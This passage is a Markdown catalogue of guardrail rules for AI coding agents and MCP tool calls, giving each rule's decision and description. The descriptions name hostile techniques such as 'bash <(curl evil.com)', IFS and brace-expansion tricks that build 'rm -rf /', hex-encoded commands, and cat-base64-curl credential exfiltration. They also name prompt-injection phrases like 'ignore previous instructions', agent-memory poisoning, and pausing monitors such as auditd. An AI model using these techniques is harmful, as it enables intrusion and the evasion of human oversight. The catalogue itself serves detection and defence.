| `ne-block-credential-bruteforce` | BLOCK | structural | Credential brute-force tool detected (hydra/medusa/ncrack). These tools automate credential guessing across network services. An AI agent running credential attacks constitutes unauthorized access. MITRE T1110.001, T1110.003. |
| `ts-audit-ai-bulk-input-pipe` | AUDIT | regex | Piping glob-expanded file input (cat ../* \| llm) into an AI CLI — may stuff unbounded token volumes into an LLM prompt, causing runaway API costs (AI Denial of Wallet, OWASP LLM10). |
| `ts-audit-ai-parallel-dispatch` | AUDIT | regex | xargs with high parallelism (-P >= 20) invoking an AI CLI — bulk parallel agent dispatch consumes API quota at scale, a denial-of-wallet pattern (OWASP LLM10). |
| `ts-block-pipe-to-shell` | BLOCK | regex | Pipe-to-shell executes unreviewed remote code. |
| `ts-block-eval-subshell-rce` | BLOCK | regex | eval with remote command substitution executes unreviewed remote code — evades pipe-to-shell detection. |
| `ts-block-shell-c-remote-subshell` | BLOCK | regex | shell -c with remote subshell executes unreviewed remote code — pipe-to-shell evasion via -c flag. |
| `ts-block-source-process-sub-rce` | BLOCK | regex | source/dot with process substitution from remote downloader executes unreviewed remote code — pipe-to-shell evasion. |
| `ts-block-interpreter-inline-rce` | BLOCK | regex | Interpreter inline download-execute: fetches remote code via HTTP module and runs it with exec/eval — pipe-to-shell evasion without a pipe (OWASP LLM02). |
| `ts-block-python-inline-os-exec` | BLOCK | regex | Python inline code executing OS commands (os.system/subprocess/__import__('os')) bypasses shell-level inspection — indirect code execution evasion (OWASP LLM02). |
| `ts-block-node-inline-child-process` | BLOCK | regex | Node.js inline code importing child_process bypasses shell-level inspection — indirect code execution evasion (OWASP LLM02). |
| `ts-block-perl-ruby-inline-system` | BLOCK | regex | Perl/Ruby inline code calling system()/exec() bypasses shell-level inspection — indirect code execution evasion (OWASP LLM02). |
| `ts-audit-llm-agent-import` | AUDIT | regex | Python one-liner importing an AI agent orchestration framework. Multi-step autonomous execution without human approval is an LLM06 risk. |
| `ts-audit-llm-sdk-direct-import` | AUDIT | regex | Python one-liner directly importing an LLM SDK client. Direct invocations outside a governance wrapper are an LLM06 risk. |
| `ts-block-agent-cli-to-shell` | BLOCK | stateful | Multi-agent framework CLI output piped to an interpreter — a compromised upstream agent can embed shell commands in its output that the downstream interpreter executes immediately (OWASP LLM06/LLM08, CWE-441 unintended proxy). |
| `ts-audit-multi-agent-context-injection` | AUDIT | regex | Writing prompt-injection keywords (SYSTEM:, [INST], ignore previous instructions) to a structured data file — other agents reading this file may execute the embedded directives as authoritative instructions (OWASP LLM01/LLM08). |
| `ts-block-indirect-injection-html-comment` | BLOCK | regex | HTML comment with an agent-targeted directive — indirect prompt injection via retrieved web content; agents may execute instructions embedded in HTML comments (OWASP LLM01). |
| `ts-block-indirect-injection-llm-format` | BLOCK | regex | LLM format escape marker ([/INST], <\|start_header_id\|>system) in command — used to break out of the instruction frame and inject a new system directive in retrieved content (OWASP LLM01). |
| `ts-block-indirect-injection-markdown-alt` | BLOCK | regex | Markdown image alt-text containing an injection directive — indirect prompt injection via retrieved Markdown; agents may act on instructions embedded in image alt-text (OWASP LLM01). |
| `ts-block-self-propagating-injection` | BLOCK | regex | Self-propagating prompt injection detected: directive to copy/forward the injection payload to other agents, files, or channels. This is a prompt-injection worm pattern (OWASP LLM01, LLM06). |
| `ts-audit-unrestricted-tool-invoke-eval` | AUDIT | regex | eval/exec called on a variable referencing AI agent output — unrestricted dynamic tool invocation allows LLM-generated content to run arbitrary OS commands (OWASP LLM06, CWE-78). |
| `ts-audit-unrestricted-tool-invoke-config` | AUDIT | regex | Agent configuration with allow_all_tools:true or an empty tool_whitelist grants unrestricted OS tool access — any LLM output can invoke arbitrary commands without boundary checks (OWASP LLM06). |
| `ts-struct-block-pipe-to-shell` | BLOCK | structural | Structural: download piped to interpreter. Download and inspect first. |
| `ts-sf-block-download-execute` | BLOCK | stateful | Stateful: direct pipe from downloader to interpreter detected (download-then-execute via pipe). |
| `ts-block-gdb-process-attach` | BLOCK | regex | gdb attached to a running process can inject arbitrary code via call system() or memory writes. Agents have no legitimate need to debug live processes. |
| `ts-block-proc-mem-write` | BLOCK | regex | Writing to /proc/PID/mem or /dev/mem injects code directly into a running process's address space, bypassing all filesystem execution controls. |
| `ts-audit-vercel-ai-sdk-install` | AUDIT | regex | Installation of the Vercel AI SDK ('ai' package). Direct model invocations without a governance wrapper are an LLM06 risk. |
| `ts-audit-vercel-ai-sdk-provider-install` | AUDIT | regex | Installation of a Vercel AI SDK provider package (@ai-sdk/openai, @ai-sdk/anthropic, @ai-sdk/google, etc.). Flags for AI governance review — LLM06 risk. |
| `ts-audit-vercel-ai-sdk-node-inline` | AUDIT | regex | Node.js inline script importing the Vercel AI SDK ('ai' package). Direct LLM invocations outside a governance wrapper are an LLM06 risk. |
| `ts-audit-ollama-serve` | AUDIT | regex | Starting a local Ollama inference server routes prompts through an unmonitored model outside organizational AI governance (LLM06, EU AI Act Art.26). Verify this deployment is approved. |
| `ts-audit-ollama-pull` | AUDIT | regex | Downloading a model via Ollama introduces weights not reviewed by the security team. Unvetted models risk model-poisoning attacks (LLM03). Verify model origin and approval. |
| `ts-audit-lmstudio-server` | AUDIT | regex | LM Studio inference server started — creates a local, unmonitored AI API endpoint outside governance controls (LLM06, EU AI Act Art.26). Verify organizational approval. |
| `ts-audit-vllm-tgi-serve` | AUDIT | regex | vLLM / TGI / MLC-LLM inference server started — creates a local OpenAI-compatible AI API endpoint outside organizational governance controls. Prompts routed through unmonitored local models bypass model allowlists, audit logging, and data-residency requirements (OWASP LLM06, EU AI Act Art.26, NIST AI RMF GOVERN-1). Verify this deployment is approved. |
| `ts-audit-open-interpreter-install` | AUDIT | regex | Installing Open Interpreter grants an LLM unrestricted shell access outside any governance wrapper. This is a high-risk shadow AI deployment (LLM06, NIST GOVERN-1). |
| `ts-audit-open-interpreter-run` | AUDIT | regex | Running Open Interpreter — an LLM with unrestricted shell access. Verify this is an approved, governed deployment (LLM06, EU AI Act Art.26). |
| `ts-audit-autogpt-install` | AUDIT | regex | Installing AutoGPT — an autonomous AI agent capable of recursive self-direction. Without a governance wrapper this is an unmonitored shadow AI deployment (LLM06, NIST GOVERN-1). |
| `ts-audit-git-commit-security-doc` | AUDIT | regex | git commit targeting SECURITY.md — AI-generated security documentation requires human review before committing (LLM09: misinformation propagation). |
| `ts-audit-git-commit-audit-path` | AUDIT | regex | git commit targeting audit/compliance/runbook path — AI-generated compliance content must be human-verified before it can be referenced by auditors (LLM09). |
| `ts-audit-append-security-doc` | AUDIT | regex | Shell append to compliance-sensitive documentation file — AI-generated content should be reviewed before persisting (LLM09: hallucination injection). |
| `ts-audit-agent-memory-write` | AUDIT | regex | Shell write to AI agent instruction file (Claude Code, Gemini CLI, Codex, Cursor, Windsurf, Cline, Copilot, Continue, Aider) — injecting malicious instructions poisons future agent sessions (persistent prompt injection). OWASP LLM01/LLM08. |
| `ts-block-agent-memory-download-overwrite` | BLOCK | regex | Downloading content from an external URL into an AI agent instruction file (Claude Code, Gemini CLI, Codex, Cursor, Windsurf, Cline, Copilot, Aider) — replaces the agent's trust anchor with attacker-controlled content (OWASP LLM01/LLM08, MITRE T1565.001). |
| `ts-block-agent-memory-copy-overwrite` | BLOCK | regex | Copying or moving a file from a world-writable staging path (/tmp, /dev/shm) over an AI agent instruction file (Claude Code, Gemini CLI, Codex, Cursor, Windsurf, Cline, Copilot, Continue, Aider) — classic two-stage attack vector (OWASP LLM08, MITRE T1565.001). |
| `ts-audit-agent-memory-git-checkout` | AUDIT | regex | Checking out an AI agent instruction file from a named git ref — could restore a poisoned version from an attacker-controlled branch (OWASP LLM01/LLM08, MITRE T1565.001). |
| `ts-block-strace-attach` | BLOCK | regex | strace attaching to a running process via -p PID intercepts all syscalls including read/write, exposing passwords, API keys, and tokens flowing through the process. MITRE T1057, T1003. |
| `ts-block-strace-credential-sniff` | AUDIT | regex | strace filtering for data-carrying syscalls (read/write/network) — commonly used to sniff credentials and API keys from running processes or commands. MITRE T1057. |
| `ts-block-ltrace-attach` | BLOCK | regex | ltrace attaching to a running process intercepts library calls including crypto and SSL functions, exposing credentials at the API level. MITRE T1057. |
| `ts-block-gcore-dump` | BLOCK | prefix | gcore dumps the entire memory of a running process to a file — exposes all heap-allocated secrets, API keys, system prompts, and in-flight credentials. MITRE T1003. |
| `ts-block-ansic-hex-escape` | BLOCK | regex | ANSI-C quoting with hex escapes ($'\xNN') — encodes arbitrary bytes to evade command detection. An attacker can write $'\x72\x6d' instead of 'rm', completely bypassing string-based rules. Legitimate shell scripts use $'\t' or $'\n', not hex encoding. MITRE T1027.004. |
| `ts-block-ansic-octal-escape` | BLOCK | regex | ANSI-C quoting with octal escapes ($'\NNN') — encodes arbitrary bytes using octal notation to evade detection. Same evasion technique as hex encoding but using base-8 (e.g., $'\162\155' = rm). MITRE T1027.004. |
| `ts-block-ansic-unicode-escape` | BLOCK | regex | ANSI-C quoting with unicode escapes ($'\uNNNN') — can encode commands using unicode code points. Also enables homoglyph attacks where visually identical but semantically different characters bypass allowlists. MITRE T1027.004. |
| `ts-block-procsub-input-exec` | BLOCK | regex | Input process substitution feeding remote content directly to an interpreter (e.g., bash <(curl evil.com)) — pipe-to-shell evasion without a visible pipe character. MITRE T1059. |
| `ts-block-procsub-eval-remote` | BLOCK | regex | eval/exec consuming input process substitution from a remote downloader — executes unreviewed remote code via named pipe evasion. MITRE T1059. |
| `ts-block-find-exec-shell` | BLOCK | regex | find with -exec/-execdir invoking a shell interpreter (sh -c, bash -c) enables arbitrary code execution over every matched file. Chains file discovery with unrestricted shell commands — can mass-modify, inject backdoors, or exfiltrate file contents at scale. MITRE T1059.004. |
| `ts-block-ifs-eval-evasion` | BLOCK | regex | IFS manipulation followed by eval/exec — attacker changes how bash splits words to construct commands from obfuscated strings. The non-standard IFS causes seemingly innocent variable values to be split into executable + arguments. MITRE T1027.004. |
| `ts-block-ifs-positional-evasion` | BLOCK | regex | IFS manipulation with positional parameter expansion (set --, $@, $*) or bare variable execution — splits a string by a custom delimiter and re-assembles it as command arguments. Classic shell obfuscation technique: IFS=.; x='rm.-rf./'; set -- $x; "$@" executes 'rm -rf /'. MITRE T1027.004. |
| `ts-audit-ifs-manipulation` | AUDIT | regex | IFS set to a non-whitespace value — while sometimes legitimate (e.g., CSV parsing), this changes fundamental shell word splitting and may be used to evade command detection. MITRE T1027.004. |
| `ts-block-eval-brace-expansion` | BLOCK | regex | eval/exec with brace expansion assembles commands from fragments at shell expansion time — the literal command string never contains the final dangerous command, evading regex-based detection. Example: 'eval {r,m} -rf /' assembles 'rm -rf /'. MITRE T1027.004. |
| `ts-block-cmdsub-brace-eval` | BLOCK | regex | echo with brace expansion inside command substitution or eval constructs command names from fragments — $(echo {r,m}) produces 'rm'. Combines two layers of indirection to evade detection. MITRE T1027.004. |
| `ts-block-brace-var-exec` | BLOCK | regex | Brace expansion result stored in a variable and then executed — two-stage command construction that first assembles the payload, then runs it. Evades single-pass detection. MITRE T1027.004. |
| `ts-block-printf-hex-pipe-shell` | BLOCK | regex | printf with hex escape sequences piped to a shell interpreter — constructs and executes encoded commands, evading ANSI-C quoting detection. MITRE T1027.004. |
| `ts-block-echo-hex-pipe-shell` | BLOCK | regex | echo -e with hex escape sequences piped to a shell — decodes hex bytes and executes the result as a command. MITRE T1027.004. |
| `ts-block-printf-hex-eval` | BLOCK | regex | eval executing command-substituted printf with hex escapes — decodes and evaluates an obfuscated command string. MITRE T1027.004. |
| `ts-block-printf-octal-pipe-shell` | BLOCK | regex | printf with octal escape sequences piped to a shell — constructs commands from octal-encoded bytes. MITRE T1027.004. |
| `ts-audit-printf-hex-cmdsub` | AUDIT | regex | printf with hex escapes inside command substitution — may construct executable strings dynamically. Auditing because command substitution in non-eval context has legitimate uses (ANSI color codes). MITRE T1027.004. |
| `ts-block-perl-pack-exec` | BLOCK | regex | Perl pack('H*',...) in one-liner decodes hex strings at runtime — reconstructs arbitrary commands invisible to static analysis. Used to evade shell command detection. MITRE T1027.013. |
| `ts-block-python-fromhex-exec` | BLOCK | regex | Python bytes.fromhex() combined with exec/eval in one-liner — decodes hex-encoded commands at runtime, bypassing all regex-based detection. MITRE T1027.013. |
| `ts-block-python-exec-fromhex` | BLOCK | regex | Python exec(bytes.fromhex(...)) in one-liner — hex-decodes and executes arbitrary code at runtime, completely invisible to shell-level command analysis. MITRE T1027.013. |
| `ts-block-python-compile-bytes` | BLOCK | regex | Python compile(bytes([...])) in one-liner — reconstructs code from raw byte arrays at runtime. Evades all text-based detection since the payload is a numeric array. MITRE T1027.013. |
| `ts-block-ruby-pack-exec` | BLOCK | regex | Ruby one-liner with byte pack('C*') feeding system/exec/eval — reconstructs commands from byte arrays at runtime. MITRE T1027.013. |
| `ts-block-ruby-hex-exec` | BLOCK | regex | Ruby one-liner with system/exec/eval and hex escape sequences — \x.. escapes reconstruct commands invisible to static analysis. MITRE T1027.013. |
| `ts-block-node-buffer-exec` | BLOCK | regex | Node.js Buffer.from(...,'hex') with exec/spawn in one-liner — hex-decodes commands at runtime to evade static detection. MITRE T1027.013. |
| `ts-block-mcp-oauth-token-read` | BLOCK | regex | Reading MCP OAuth token file — these files contain bearer tokens that authorize MCP server access; exfiltrating them allows forging requests as the agent's authenticated identity (OWASP LLM09, CWE-522). |
| `ts-block-mcp-socket-hijack` | BLOCK | regex | Binding or proxying a MCP Unix socket — a man-in-the-middle listener on the MCP socket can harvest OAuth tokens, intercept tool calls, and tamper with redirect URIs (OWASP LLM09, CWE-300). |
| `ts-block-agent-session-hijack` | BLOCK | regex | Accessing /proc/PID/fd of a running agent process via pgrep — exposes open sockets and IPC channels, enabling session injection without authentication (OWASP LLM06, MITRE T1055). |
| `ts-block-mcp-socket-connect` | BLOCK | regex | ptrace/gdb attach to an AI agent process by name — intercepts in-flight syscalls and memory, enabling extraction of active session tokens and mid-session command injection (OWASP LLM06, MITRE T1055.008). |
| `ts-block-orchestration-approval-bypass` | BLOCK | regex | In-place sed modification of orchestration config approval gate — removing human oversight controls from a workflow file is a critical control bypass and agent orchestration hijacking pattern (OWASP LLM06, MITRE T1565.001). |
| `ts-block-task-queue-injection` | BLOCK | regex | Task queue injection via Python redis client or Celery CLI — pushing arbitrary tasks into an agent's work queue hijacks orchestration without modifying source files (OWASP LLM06, MITRE T1565). |
| `ts-audit-orchestration-config-jq-write` | AUDIT | regex | jq in-place modification of agent capabilities or role config — updating capabilities/permissions arrays in orchestration config files can silently escalate agent authority (OWASP LLM06, MITRE T1565.001). |
| `ts-block-sendmail-agent` | BLOCK | structural | sendmail/ssmtp/msmtp called by AI agent — unattended email delivery is an AI-assisted social engineering vector. Agents must not send email without explicit human review and consent (OWASP LLM09, MITRE T1534). |
| `ts-block-mail-noninteractive` | BLOCK | regex | Non-interactive email send via mutt/mail/mailx with subject flag and recipient — AI agent sending email is an AI-assisted social engineering risk. Humans must compose and send email (OWASP LLM09, MITRE T1534). |
| `ts-audit-slack-webhook-post` | AUDIT | regex | curl POST to a Slack/Teams/Discord webhook — AI agent sending unsolicited messages to org channels is an AI-assisted social engineering risk. Confirm message content and intent before allowing (OWASP LLM09, MITRE T1534). |
| `ts-block-base64-decode-pipe-shell` | BLOCK | regex | Base64-decoded payload piped to a shell — encoding commands in base64 is a standard guardrail evasion technique. The decoded payload is invisible to string-based policy enforcement. OWASP LLM01, MITRE T1027.013. |
| `ts-block-eval-base64-substitution` | BLOCK | regex | eval of base64-decoded command substitution — executes a runtime-decoded payload, bypassing all static guardrail analysis. OWASP LLM01, MITRE T1027.013. |
| `ts-block-auditd-disable` | BLOCK | regex | Stopping or disabling the audit daemon (auditd) — eliminates the system audit trail and bypasses all SIEM/SOC monitoring. No legitimate AI coding agent task requires disabling auditd. OWASP LLM06, MITRE T1562.001. |
| `ts-audit-nohup-agent-oversight` | AUDIT | regex | nohup backgrounding an agent hook or oversight process — detaches the process from the terminal, making it invisible to the session and potentially bypassing approval workflows. OWASP LLM06, MITRE T1562. |
| `ts-audit-context-file-control-char-injection` | AUDIT | regex | Writing ANSI escape codes, null bytes, or zero-width Unicode characters to an AI agent context file — injects invisible or display-corrupting content into the agent's context window, hiding malicious instructions from human review. OWASP LLM01, MITRE T1059. |
| `ts-audit-autonomous-cred-encode-exfil-chain` | AUDIT | stateful | 3-stage compound chain: file read → encoding → network transmission — matches the canonical credential-exfiltration pipeline (cat + base64 + curl). Each step is individually low-risk; the combination is a high-confidence exfiltration attempt. OWASP LLM06, MITRE T1059. |
| `ts-audit-localhost-agent-api-call` | AUDIT | regex | curl POST to a localhost OpenAI-compatible API endpoint — calling a peer agent's API with a crafted payload injects instructions into the target agent's context (agent-to-agent lateral pivot). OWASP LLM06, MITRE T1071. |
| `ts-audit-multimodal-sensitive-file-api` | AUDIT | regex | Sensitive file read combined with multimodal AI API call — embedding credential files or sensitive content into images/audio submitted to vision models is a multimodal prompt injection vector. OWASP LLM01, MITRE T1059. |
| `ts-audit-network-pipe-to-llm` | AUDIT | regex | Network content piped directly to an LLM CLI tool — fetched content may contain prompt injection payloads that override AI agent instructions. Analogous to curl\|bash but targeting LLM context hijacking (OWASP LLM01, CWE-77). |
| `ts-audit-mcp-server-npx-install` | AUDIT | regex | npx -y installing an MCP server package without interactive review — typosquatted or compromised MCP server packages can impersonate trusted tools and gain full access to agent context, tool execution, and data flows. OWASP LLM08, MITRE T1195. |
| `ts-block-git-commit-no-verify` | BLOCK | regex | git commit --no-verify (-n) bypasses all pre-commit hooks including security linters (semgrep, bandit, gosec, trufflehog) — the last automated gate catching AI-generated vulnerabilities (SQLi, hardcoded secrets, weak crypto) before they enter source control (OWASP LLM05, CWE-799). |
| `ts-audit-git-push-no-verify` | AUDIT | regex | git push --no-verify bypasses pre-push hooks including remote security scanning gates — skipping final automated quality and security checks before LLM-generated code reaches shared branches. OWASP LLM05, MITRE T1059. |
| `ts-block-enable-f-loadable-builtin` | BLOCK | regex | Loading arbitrary shared object as bash builtin via 'enable -f' — injects code directly into bash's process address space. Unlike LD_PRELOAD, this bypasses environment variable monitoring entirely. The loaded code can replace builtins (read, cd, echo), intercept all shell I/O, and access bash internal state. MITRE T1546.004, CWE-94. |
| `ts-block-signal-process-freeze` | BLOCK | regex | Sending SIGSTOP/SIGTSTP/SIGCONT to a process — freezes a process without killing it. Used to silently pause security monitors while performing malicious actions, then resume them leaving no evidence. MITRE T1562.001. |
| `ts-block-pkill-process-freeze` | BLOCK | regex | Sending SIGSTOP/SIGTSTP/SIGCONT via pkill/killall — freezes processes by name pattern. Can target security monitors (agentshield, auditd, falco) without knowing their PID. MITRE T1562.001. |
| `ts-block-signal-freeze-pgrep` | BLOCK | regex | SIGSTOP/SIGCONT via command substitution (e.g., kill -STOP $(pgrep auditd)) — dynamically discovers and freezes monitoring processes. The substitution makes detection harder. MITRE T1562.001. |

### uncategorized (2 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `ts-allow-readonly` | ALLOW | prefix | Read-only or informational command. |
| `ts-sem-block-high-risk` | BLOCK | semantic | Semantic: any command with critical risk intent is blocked. |

## MCP Rules

### credential-exposure (16 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-struct-block-sensitive-path-write` | BLOCK | structural | MCP tool writing to sensitive/protected path |
| `mcp-struct-block-path-traversal` | BLOCK | structural | Path traversal detected in path argument — attempt to escape intended directory |
| `mcp-struct-block-path-traversal-directory` | BLOCK | structural | Path traversal detected in directory argument — attempt to escape intended directory |
| `mcp-sec-block-ssh-access` | BLOCK | mcp_rule | Access to SSH key directories is blocked. |
| `mcp-sec-block-aws-access` | BLOCK | mcp_rule | Access to AWS credential directories is blocked. |
| `mcp-sec-block-gnupg-access` | BLOCK | mcp_rule | Access to GPG key directories is blocked. |
| `mcp-sec-block-kube-access` | BLOCK | mcp_rule | Access to Kubernetes config is blocked. |
| `mcp-sec-block-gcloud-access` | BLOCK | mcp_rule | Access to Google Cloud credentials is blocked. |
| `mcp-sec-block-dotenv-read` | AUDIT | mcp_rule | .env file access flagged for review — may contain secrets. |
| `mcp-sec-block-git-credentials` | BLOCK | mcp_rule | Git credential file access is blocked. |
| `mcp-sec-block-mysql-uri` | BLOCK | resource_rule | Direct MySQL database access via MCP is blocked. |
| `mcp-sec-block-postgres-uri` | BLOCK | resource_rule | Direct PostgreSQL database access via MCP is blocked. |
| `mcp-sec-block-redis-uri` | BLOCK | resource_rule | Direct Redis access via MCP is blocked. |
| `mcp-sec-block-mongodb-uri` | BLOCK | resource_rule | Direct MongoDB access via MCP is blocked. |
| `mcp-sec-block-ssh-uri` | BLOCK | resource_rule | Resource read of SSH key files is blocked. |
| `mcp-sec-block-aws-uri` | BLOCK | resource_rule | Resource read of AWS credential files is blocked. |

### data-exfiltration (19 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-llmdf-audit-system-prompt-read` | AUDIT | mcp_rule | Reading a file matching system_prompt* may expose operator instructions — LLM07 (System Prompt Leakage). Review whether this access is intentional. |
| `mcp-llmdf-audit-sysprompt-dotfile-read` | AUDIT | mcp_rule | Reading a hidden system prompt dotfile (.sysprompt*) may expose confidential operator instructions — LLM07 (System Prompt Leakage). |
| `mcp-llmdf-audit-training-data-read` | AUDIT | mcp_rule | Reading from a training_data/ directory may expose model training datasets — LLM02 (Sensitive Information Disclosure). Verify this access is authorized. |
| `mcp-llmdf-audit-model-weights-read` | AUDIT | mcp_rule | Reading from model_weights/ directory may expose proprietary model parameters — LLM02 (Sensitive Information Disclosure). |
| `mcp-llmdf-audit-checkpoints-read` | AUDIT | mcp_rule | Reading from a checkpoints/ directory may expose model state (weights, optimizer state) — LLM02 (Sensitive Information Disclosure). |
| `mcp-llmdf-audit-openai-config-write` | AUDIT | mcp_rule | Writing to an OpenAI config file (.openai*) may reroute AI API calls to an unauthorized endpoint — LLM06 (Excessive Agency). Human review required. |
| `mcp-llmdf-audit-anthropic-config-write` | AUDIT | mcp_rule | Writing to an Anthropic config file (.anthropic*) may reroute AI API calls to an unauthorized endpoint — LLM06 (Excessive Agency). Human review required. |
| `mcp-llmdf-audit-ai-config-write` | AUDIT | mcp_rule | Writing to an AI config file (ai_config*) may alter model selection or endpoint routing without authorization — LLM06 (Excessive Agency). |
| `mcp-llmdf-audit-agent-session-db-read` | AUDIT | mcp_rule | Reading an AI agent session or conversation database via MCP — these files may contain credentials, API keys, and PII from prior sessions, creating a cross-session context leakage vector. OWASP LLM02/LLM07. |
| `mcp-llmdf-audit-agent-memory-bulk-read` | AUDIT | mcp_rule | Accessing Claude Code memory files via MCP — these files persist sensitive context (credentials, architectural decisions, API keys) across agent sessions and may expose prior session data to unauthorized readers. OWASP LLM02. |
| `mcp-llmdf-audit-cross-tenant-tmp-workspace` | AUDIT | mcp_rule | Accessing /tmp/mcp-workspace* via MCP — shared MCP workspace directories without tenant-scoped paths expose other tenants' tool call artifacts. Cross-tenant data leakage in shared agent infrastructure. OWASP LLM02/LLM06. |
| `mcp-llmdf-audit-cross-tenant-shared-cache` | AUDIT | mcp_rule | Accessing /tmp/agent-cache* via MCP — shared agent cache directories in multi-tenant deployments may expose tool call results, session state, or intermediate data from other tenants. OWASP LLM02/LLM06. |
| `mcp-struct-block-ssrf-metadata` | BLOCK | structural | SSRF detected — request to cloud metadata endpoint |
| `mcp-struct-block-ssrf-metadata-endpoint` | BLOCK | structural | SSRF detected — request to internal service via endpoint argument |
| `mcp-struct-block-ssrf-private-network` | BLOCK | structural | SSRF detected — request to private network IP range |
| `mcp-struct-block-ssrf-target` | BLOCK | structural | SSRF detected via 'target' argument — request to metadata endpoint or private network |
| `mcp-struct-block-ssrf-server` | BLOCK | structural | SSRF detected via 'server' argument — request to metadata endpoint or private network |
| `mcp-struct-block-ssrf-base-url` | BLOCK | structural | SSRF detected via 'base_url' argument — request to metadata endpoint or private network |
| `mcp-struct-audit-network-request` | AUDIT | structural | MCP tool making external network request |

### destructive-ops (17 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-fin-audit-financial-tools` | AUDIT | mcp_rule | Financial tool call flagged for review. |
| `mcp-fin-cap-transfer-amount` | BLOCK | value_limit | Token/crypto transfer exceeds safety limit of 100 units. |
| `mcp-fin-cap-transfer-quantity` | BLOCK | value_limit | Token/crypto transfer quantity exceeds safety limit. |
| `mcp-fin-cap-payment-amount` | BLOCK | value_limit | Payment amount exceeds safety limit of $1,000. |
| `mcp-fin-cap-payment-total` | BLOCK | value_limit | Payment total exceeds safety limit of $1,000. |
| `mcp-fin-cap-mint-amount` | BLOCK | value_limit | Minting amount exceeds safety limit. |
| `mcp-fin-block-negative-transfer` | BLOCK | value_limit | Negative transfer amounts are not allowed. |
| `mcp-fin-cap-withdrawal` | BLOCK | value_limit | Withdrawal exceeds safety limit of 500 units. |
| `mcp-fin-block-negative-withdrawal` | BLOCK | value_limit | Negative withdrawal amounts are not allowed. |
| `mcp-fin-cap-provision-count` | BLOCK | value_limit | Instance count exceeds safety limit of 50 — large provisioning requires human approval. |
| `mcp-fin-cap-provision-quantity` | BLOCK | value_limit | Provisioning quantity exceeds safety limit of 50. |
| `mcp-safety-block-etc-write` | BLOCK | mcp_rule | File write to /etc/ system directory is blocked. |
| `mcp-safety-block-usr-write` | BLOCK | mcp_rule | File write to /usr/ system directory is blocked. |
| `mcp-safety-block-var-write` | BLOCK | mcp_rule | File write to /var/ system directory is blocked. |
| `mcp-safety-block-root-write` | BLOCK | mcp_rule | File write to filesystem root is blocked. |
| `mcp-safety-audit-delete` | AUDIT | mcp_rule | File deletion operations flagged for review. |
| `mcp-safety-audit-process` | AUDIT | mcp_rule | Process/system management operations flagged for review. |

### mcp-safety (8 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `blocked-tool:execute_command` | BLOCK | blocked_tool | Tool 'execute_command' is blocked by default. |
| `blocked-tool:run_shell` | BLOCK | blocked_tool | Tool 'run_shell' is blocked by default. |
| `blocked-tool:run_terminal_command` | BLOCK | blocked_tool | Tool 'run_terminal_command' is blocked by default. |
| `blocked-tool:shell_exec` | BLOCK | blocked_tool | Tool 'shell_exec' is blocked by default. |
| `blocked-tool:run_bash` | BLOCK | blocked_tool | Tool 'run_bash' is blocked by default. |
| `blocked-tool:run_code` | BLOCK | blocked_tool | Tool 'run_code' is blocked by default. |
| `blocked-tool:eval_code` | BLOCK | blocked_tool | Tool 'eval_code' is blocked by default. |
| `blocked-tool:exec_code` | BLOCK | blocked_tool | Tool 'exec_code' is blocked by default. |

### persistence-evasion (5 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-persist-block-shell-profile-write` | BLOCK | structural | MCP write to shell startup dotfile — code injected here executes on every new shell session. Persistent execution without any cron/systemd entry. MITRE T1546.004. |
| `mcp-persist-block-launchagent-write` | BLOCK | structural | MCP write to macOS LaunchAgent/Daemon directory installs a persistent background service loaded on login. MITRE T1543.001. |
| `mcp-persist-block-git-hook-write` | BLOCK | structural | MCP write to .git/hooks/ installs a persistent git hook that executes on every matching git operation (commit, push, checkout, etc.) without any shell-level interception. MITRE T1546. |
| `mcp-persist-block-user-systemd-write` | BLOCK | structural | MCP write to user-level systemd/autostart directory installs a persistent service that starts without root on next login. MITRE T1543.002. |
| `mcp-persist-block-ssh-authkeys-write` | BLOCK | structural | MCP write to SSH authorized_keys adds a persistent backdoor public key granting remote shell access with no password. Write to ~/.ssh/config can proxy all SSH connections to an attacker. MITRE T1098.004. |

### privilege-escalation (10 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-privesc-block-docker-socket` | BLOCK | mcp_rule | Access to Docker socket blocked — enables container escape and full host compromise. MITRE T1611. |
| `mcp-privesc-block-k8s-clusterrolebinding-write` | BLOCK | mcp_rule | Writing Kubernetes ClusterRoleBinding manifest blocked — may grant cluster-admin to arbitrary service accounts. MITRE T1078.001. |
| `mcp-privesc-block-suid-chmod` | BLOCK | structural | SUID bit set on executable blocked — allows local privilege escalation by executing binary as file owner. MITRE T1548.001. |
| `mcp-privesc-block-docker-sock-structural` | BLOCK | structural | Docker socket path detected in MCP tool argument — container escape vector. MITRE T1611. |
| `mcp-privesc-block-k8s-cluster-admin` | BLOCK | structural | Kubernetes ClusterRoleBinding or cluster-admin grant detected in MCP content — grants unrestricted cluster access. MITRE T1078.001. |
| `mcp-privesc-block-privileged-container` | BLOCK | structural | Privileged container flag detected in MCP content — breaks container isolation and enables host privilege escalation. MITRE T1611. |
| `mcp-privesc-audit-sudoers-content` | AUDIT | structural | Sudo configuration content (NOPASSWD or ALL=(ALL)) detected in MCP tool argument — may grant passwordless root access. MITRE T1548.003. |
| `mcp-privesc-block-linux-capabilities` | BLOCK | structural | Linux capabilities grant detected in MCP content — may enable privilege escalation via capability abuse. MITRE T1548.001. |
| `mcp-struct-block-privesc-permissions` | BLOCK | structural | Privilege escalation — permission change on system-critical path |
| `mcp-struct-block-auth-bypass` | BLOCK | structural | Privilege escalation — attempt to disable authentication via config modification |

### reconnaissance (12 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `mcp-recon-audit-etc-listing` | AUDIT | mcp_rule | Listing /etc/ system directory flagged — may enumerate config files containing credentials or system layout. MITRE T1083. |
| `mcp-recon-audit-proc-read` | AUDIT | mcp_rule | Access to /proc filesystem flagged — can enumerate running processes, network connections, and memory maps. MITRE T1057. |
| `mcp-recon-audit-home-listing` | AUDIT | mcp_rule | Listing /home directory contents flagged — enumerates local user accounts and their project layouts. MITRE T1083. |
| `mcp-recon-audit-os-release-read` | AUDIT | mcp_rule | Reading /etc/os-release to fingerprint OS version and distribution. MITRE T1082. |
